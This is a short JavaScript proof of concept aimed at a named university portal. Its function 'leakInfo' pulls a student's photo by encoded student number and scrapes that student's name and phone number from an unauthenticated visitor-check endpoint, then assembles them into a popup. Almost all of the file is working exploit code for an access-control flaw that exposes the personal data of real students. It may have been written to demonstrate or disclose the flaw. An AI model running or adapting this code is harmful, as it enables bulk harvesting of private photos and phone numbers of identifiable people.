HOST = "https://kutis.kyonggi.ac.kr";


function getImg(hakbun) {
    // 사진조회 
    var img = new Image();
    img.src = HOST + "/webkutis/TransferImageStream.do?hakbun=" + btoa(hakbun);
    img.width = 150;
    return img;
}

function getInfo(hakbun) {
    // 이름, 전화번호 조회 함수
    var name_pattern = /<input type="text" name="userName" id="userName" class="user" value="(.*)" size="20" readonly>/g;
    var phone_pattern = /<input type="text" name="userPhone" id="userPhone" class="user" value="(.*)" size="15" readonly>/g;

    return new Promise(function (resolve, reject) {
        fetch(HOST + "/webkutis/visitors/chkCert.jsp?cert_no=&visit_date=20211123&cert_gb=1&id=" + hakbun)
        .then(r => r.text()).then(function (resp) {
            name = name_pattern.exec(resp)[1];
            phone = phone_pattern.exec(resp)[1];
            var div = document.createElement('div');
            div.innerHTML = `<span>${hakbun}</span> <span>${name}</span><br><span>${phone}</span>`;
            resolve(div);
        });
    });
}

function getFrame() {
    var div = document.createElement('div');
    div.style = `
    position:fixed;
    top:0;
    `;
    div.addEventListener('click', div.remove);
    return div;
}

async function leakInfo(hakbun) {
    // 학생 정보를 띄우는 함수
    var frame = getFrame();
    var img = getImg(hakbun);
    var info = await getInfo(hakbun);

    frame.appendChild(img);
    frame.appendChild(info);

    // document.body.appendChild(frame);
}

leakInfo('000000000');